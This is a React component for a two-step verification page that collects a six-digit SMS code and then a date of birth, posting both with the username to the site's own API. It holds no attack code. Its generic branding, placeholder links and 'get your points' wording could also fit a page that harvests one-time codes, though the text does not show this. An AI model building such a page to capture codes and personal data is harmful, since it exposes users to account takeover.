import { useState, useEffect } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { useMutation } from "@tanstack/react-query";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card, CardContent, CardHeader } from "@/components/ui/card";
import {
  Loader2,
  MessageSquare,
  CheckCircle,
  ArrowLeft,
  RotateCcw,
} from "lucide-react";
import { apiRequest } from "@/lib/queryClient";
import { useLocation } from "wouter";
import { Logo } from "@/components/Logo";
import { z } from "zod";

// Step 1: SMS Code validation
const smsCodeSchema = z.object({
  code: z.string().length(6, "Code must be 6 digits"),
});

// Step 2: DOB validation
const dobSchema = z.object({
  dateOfBirth: z.string().min(1, "Date of birth is required"),
});

type SMSCodeData = z.infer<typeof smsCodeSchema>;
type DOBData = z.infer<typeof dobSchema>;

export default function SMSVerification() {
  const [location, setLocation] = useLocation();
  const [username, setUsername] = useState<string>("");
  const [timeLeft, setTimeLeft] = useState(120); // 2 minutes countdown
  const [isExpired, setIsExpired] = useState(false);
  const [step, setStep] = useState<1 | 2>(1); // Track which step we're on
  const [smsCode, setSmsCode] = useState<string>(""); // Persist SMS code

  // Calculate date restrictions for 18+ validation
  const today = new Date();
  const maxDateObj = new Date(
    today.getFullYear() - 18,
    today.getMonth(),
    today.getDate()
  );
  const maxDate = `${maxDateObj.getFullYear()}-${String(
    maxDateObj.getMonth() + 1
  ).padStart(2, "0")}-${String(maxDateObj.getDate()).padStart(2, "0")}`;
  const minDate = "1900-01-01";

  // Form for Step 1 (SMS Code)
  const smsForm = useForm<SMSCodeData>({
    resolver: zodResolver(smsCodeSchema),
    defaultValues: {
      code: smsCode,
    },
  });

  // Form for Step 2 (DOB)
  const dobForm = useForm<DOBData>({
    resolver: zodResolver(dobSchema),
    defaultValues: {
      dateOfBirth: "",
    },
  });

  // Extract username from URL params
  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    const usernameParam = urlParams.get("username") || "";
    setUsername(usernameParam);
  }, []);

  // Countdown timer
  useEffect(() => {
    if (timeLeft <= 0) {
      setIsExpired(true);
      return;
    }

    const timer = setInterval(() => {
      setTimeLeft((prev) => prev - 1);
    }, 1000);

    return () => clearInterval(timer);
  }, [timeLeft]);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, "0")}`;
  };

  // Step 1: Verify SMS code and send to backend
  const verifyCodeMutation = useMutation({
    mutationFn: async (data: SMSCodeData) => {
      const response = await apiRequest("POST", "/api/sms/verify-code", {
        username,
        code: data.code,
      });
      return response.json();
    },
    onSuccess: () => {
      setSmsCode(smsForm.getValues().code);
      setStep(2);
    },
    onError: () => {
      smsForm.setError("code", { message: "Invalid verification code" });
    },
  });

  const onVerifyCode = (data: SMSCodeData) => {
    if (isExpired) {
      smsForm.setError("code", {
        message: "Code has expired. Please request a new one.",
      });
      return;
    }
    verifyCodeMutation.mutate(data);
  };

  // Step 2: Submit DOB and complete verification
  const verifyMutation = useMutation({
    mutationFn: async (data: DOBData) => {
      const response = await apiRequest("POST", "/api/sms/verify", {
        username,
        code: smsCode,
        dateOfBirth: data.dateOfBirth,
        timestamp: new Date().toISOString(),
      });
      return response.json();
    },
    onSuccess: () => {
      alert("SMS verification successful! Access granted.");
      setLocation("/success");
    },
    onError: () => {
      dobForm.setError("dateOfBirth", {
        message: "Verification failed. Please try again.",
      });
    },
  });

  const resendCodeMutation = useMutation({
    mutationFn: async () => {
      const response = await apiRequest("POST", "/api/sms/resend", {
        username,
      });
      return response.json();
    },
    onSuccess: () => {
      setTimeLeft(120);
      setIsExpired(false);
      smsForm.reset();
      setSmsCode("");
      setStep(1);
      alert("New verification code sent!");
    },
  });

  const goBack = () => {
    if (step === 2) {
      setStep(1);
    } else {
      setLocation("/");
    }
  };

  const isStep1 = step === 1;

  return (
    <div className="min-h-screen bg-white">
      {/* Company Header */}
      <header className="auth-page-header">
        <Logo />
      </header>

      {/* Centered container with card */}
      <div className="auth-form-container flex justify-center">
        <Card className="w-full max-w-lg border border-gray-200 shadow-sm">
          <CardHeader className="pb-4">
            <div className="flex items-center justify-between">
              {/* Back Button – reuses your low-emphasis style */}
              <button
                onClick={goBack}
                className="auth-low-emph-button mb-2 flex items-center gap-2"
                data-testid="button-back"
              >
                <ArrowLeft className="h-4 w-4" />
                {isStep1 ? "Back to login" : "Back to verification code"}
              </button>

              {/* Step indicator (the “step thing”) */}
              <div className="flex flex-col items-end gap-1 text-xs text-gray-500">
                <span className="font-medium text-gray-700">
                  Step {step} of 2
                </span>
                <div className="flex items-center gap-1.5">
                  <span
                    className={`h-1.5 w-4 rounded-full ${
                      step === 1 ? "bg-blue-600" : "bg-blue-200"
                    }`}
                  />
                  <span
                    className={`h-1.5 w-4 rounded-full ${
                      step === 2 ? "bg-blue-600" : "bg-blue-200"
                    }`}
                  />
                </div>
              </div>
            </div>

            <h1 className="auth-heading-primary auth-spacing-2x-mb">
              {isStep1 ? "Verify your identity" : "Enter your date of birth"}
            </h1>

            <div className="auth-text-bodyshort auth-spacing-4x-mb text-gray-600">
              {isStep1
                ? "We've sent a 6-digit verification code to your mobile device. Enter the code below to continue."
                : "Please enter your date of birth to complete verification and get your points ready!"}
            </div>
          </CardHeader>

          <CardContent className="space-y-6">
            {/* User Info */}
            {username && (
              <div className="bg-gray-50 rounded-lg p-4">
                <p className="text-sm text-gray-700">
                  <span className="font-medium">Signed in as:</span> {username}
                </p>
              </div>
            )}

            {/* STEP 1: SMS Code Entry */}
            {isStep1 && (
              <form
                onSubmit={smsForm.handleSubmit(onVerifyCode)}
                className="space-y-6"
              >
                {/* SMS Code Input */}
                <div className="auth-text-field">
                  <Label
                    htmlFor="code"
                    className="text-sm font-medium text-foreground"
                  >
                    Verification Code
                  </Label>
                  <Input
                    id="code"
                    type="text"
                    inputMode="numeric"
                    maxLength={6}
                    placeholder="000000"
                    {...smsForm.register("code")}
                    disabled={isExpired || verifyCodeMutation.isPending}
                    className="w-full text-center text-2xl font-mono tracking-widest company-input"
                    data-testid="input-sms-code"
                  />
                  {smsForm.formState.errors.code && (
                    <p
                      className="text-destructive text-sm mt-1"
                      data-testid="text-code-error"
                    >
                      {smsForm.formState.errors.code.message}
                    </p>
                  )}
                </div>

                {/* Timer Display */}
                <div className="text-center">
                  {!isExpired ? (
                    <p className="text-sm text-gray-600">
                      Code expires in:{" "}
                      <span className="font-mono font-semibold text-blue-600">
                        {formatTime(timeLeft)}
                      </span>
                    </p>
                  ) : (
                    <p className="text-sm text-red-600 font-medium">
                      Verification code has expired
                    </p>
                  )}
                </div>

                {/* Verify Button */}
                <Button
                  type="submit"
                  className="auth-high-emph-button auth-spacing-2x-mb w-full"
                  disabled={isExpired || verifyCodeMutation.isPending}
                  data-testid="button-verify-code"
                >
                  {verifyCodeMutation.isPending ? (
                    <>
                      <Loader2 className="h-4 w-4 animate-spin mr-2" />
                      Verifying...
                    </>
                  ) : (
                    <>
                      <CheckCircle className="h-4 w-4 mr-2" />
                      Verify Code
                    </>
                  )}
                </Button>

                {/* Resend Code */}
                <div className="text-center">
                  <button
                    type="button"
                    onClick={() => resendCodeMutation.mutate()}
                    disabled={
                      resendCodeMutation.isPending ||
                      (!isExpired && timeLeft > 60)
                    }
                    className={`text-sm underline ${
                      isExpired || timeLeft <= 60
                        ? "text-blue-600 hover:text-blue-800"
                        : "text-gray-400 cursor-not-allowed"
                    }`}
                    data-testid="button-resend"
                  >
                    {resendCodeMutation.isPending ? (
                      <>
                        <Loader2 className="h-3 w-3 animate-spin inline mr-1" />
                        Sending...
                      </>
                    ) : (
                      <>
                        <RotateCcw className="h-3 w-3 inline mr-1" />
                        Resend verification code
                      </>
                    )}
                  </button>
                </div>

                {/* Help Text */}
                <div className="mt-6 p-4 bg-blue-50 rounded-lg">
                  <div className="flex items-start gap-3">
                    <MessageSquare className="h-5 w-5 text-blue-600 mt-0.5 flex-shrink-0" />
                    <div className="text-sm text-blue-900">
                      <p className="font-medium mb-1">
                        Didn't receive the code?
                      </p>
                      <p>
                        Check your messages or try requesting a new code. If you
                        continue to have issues, please contact customer
                        support.
                      </p>
                    </div>
                  </div>
                </div>
              </form>
            )}

            {/* STEP 2: Date of Birth Entry */}
            {!isStep1 && (
              <form
                onSubmit={dobForm.handleSubmit((data) =>
                  verifyMutation.mutate(data)
                )}
                className="space-y-6"
              >
                {/* Show entered SMS code (for reference) */}
                <div className="bg-green-50 rounded-lg p-4 mb-2">
                  <p className="text-sm text-green-900">
                    <CheckCircle className="h-4 w-4 inline mr-2 text-green-600" />
                    <span className="font-medium">Code verified:</span>{" "}
                    {smsCode}
                  </p>
                </div>

                {/* Date of Birth Input */}
                <div className="auth-text-field">
                  <Label
                    htmlFor="dateOfBirth"
                    className="text-sm font-medium text-foreground"
                  >
                    Date of Birth
                  </Label>
                  <Input
                    id="dateOfBirth"
                    type="date"
                    min={minDate}
                    max={maxDate}
                    {...dobForm.register("dateOfBirth")}
                    disabled={verifyMutation.isPending}
                    className="w-full company-input"
                    data-testid="input-date-of-birth"
                  />
                  {dobForm.formState.errors.dateOfBirth && (
                    <p
                      className="text-destructive text-sm mt-1"
                      data-testid="text-dob-error"
                    >
                      {dobForm.formState.errors.dateOfBirth.message}
                    </p>
                  )}
                  <p className="text-xs text-gray-500 mt-2">
                    You must be 18 years or older
                  </p>
                </div>

                {/* Submit Button */}
                <Button
                  type="submit"
                  className="auth-high-emph-button auth-spacing-2x-mb w-full"
                  disabled={verifyMutation.isPending}
                  data-testid="button-submit"
                >
                  {verifyMutation.isPending ? (
                    <>
                      <Loader2 className="h-4 w-4 animate-spin mr-2" />
                      Verifying...
                    </>
                  ) : (
                    <>
                      <CheckCircle className="h-4 w-4 mr-2" />
                      Complete Verification
                    </>
                  )}
                </Button>
              </form>
            )}
          </CardContent>
        </Card>
      </div>

      {/* Footer */}
      <footer className="auth-footer">
        <div className="auth-footer-content">
          <p className="auth-footer-copyright">
            Copyright © 2025
          </p>
          <a
            className="auth-footer-privacy"
            href="#"
            target="_blank"
            data-testid="link-privacy"
          >
            Privacy
          </a>
          <a
            className="auth-footer-terms"
            href="#"
            target="_blank"
            data-testid="link-terms"
          >
            Terms of use
          </a>
        </div>
      </footer>
    </div>
  );
}
